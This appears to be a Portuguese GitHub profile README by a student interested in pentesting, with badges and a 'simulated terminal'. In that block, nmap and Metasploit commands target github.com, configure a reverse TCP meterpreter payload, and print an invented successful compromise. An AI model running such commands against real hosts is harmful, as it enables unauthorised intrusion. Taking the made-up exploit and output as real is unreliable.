<!-- Banner ASCII -->
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     
██║ ██╔╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    
█████╔╝ ███████║██║     █████╔╝ █████╗  ██║  ██║    
██╔═██╗ ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║    
██║  ██╗██║  ██║╚██████╗██║  ██╗███████╗██████╔╝     
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝       
![Matrix Rain](https://i.gifer.com/origin/7c/7c9a8e4d75964fbb6b4fba0625b7e0e4_w200.gif)

---

## 👾 Sobre mim
> 💻 Estudante de **Ciência da Computação**  
> 🔐 Foco em **Cibersegurança, Pentest e Automação**  
> 🐧 Apaixonado por **Linux e hacking ético**  
> 🚀 Sempre explorando novas tecnologias  

---

## 🛠️ Skills & Tools
![Linux](https://img.shields.io/badge/Linux-000000?style=for-the-badge&logo=linux&logoColor=white)
![Python](https://img.shields.io/badge/Python-14354C?style=for-the-badge&logo=python&logoColor=yellow)
![Bash](https://img.shields.io/badge/Bash-121011?style=for-the-badge&logo=gnu-bash&logoColor=green)
![Networking](https://img.shields.io/badge/Networking-0a0a0a?style=for-the-badge&logo=cisco&logoColor=00ff00)
![CyberSec](https://img.shields.io/badge/CyberSec-111111?style=for-the-badge&logo=protonvpn&logoColor=00ff00)

---

## ⚡ Terminal Simulado

```bash
┌──(joao㉿github)-[~/]
└─$ whoami
joao

┌──(joao㉿github)-[~/]
└─$ uname -a
Linux kali 6.6.12-arch1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux

┌──(joao㉿github)-[~/]
└─$ nmap -A github.com
Starting Nmap 7.93 ( https://nmap.org ) at 2025-08-28
Nmap scan report for github.com (140.82.121.3)
Host is up (0.032s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh      OpenSSH 9.2
80/tcp  open  http     GitHub Web
443/tcp open  https    GitHub Secure
┌──(joao㉿github)-[~/]
└─$ msfconsole

msf6 > use exploit/multi/http/github_rce
msf6 exploit(github_rce) > set RHOSTS github.com
RHOSTS => github.com
msf6 exploit(github_rce) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(github_rce) > set LHOST 192.168.0.133
LHOST => 192.168.0.133
msf6 exploit(github_rce) > run

[*] Started reverse TCP handler on 192.168.0.133:4444 
[*] Exploiting target github.com...
[*] Sending payload...
[+] Payload executed successfully!
[*] Meterpreter session 1 opened (192.168.0.133:4444 -> 140.82.121.3:443)

meterpreter > sysinfo
Computer     : github-server
OS           : Linux
Architecture : x64
Meterpreter  : x86/linux

📊 Status do Sistema

┌──(system㉿github)-[~/logs]
└─$ tail -f visitors.log

[2025-08-28 08:00:01] Incoming connection detected...
[2025-08-28 08:00:02] IP: 192.168.133.42  STATUS: ACCESS GRANTED ✅
[2025-08-28 08:00:03] Visitor count updated:

🌍 Contato
	•	🔗 LinkedIn
	•	📧 seuemail@email.com

+ Status: Online
+ Modo: Aprendizado Ativo
- Erros: Nenhum detectado
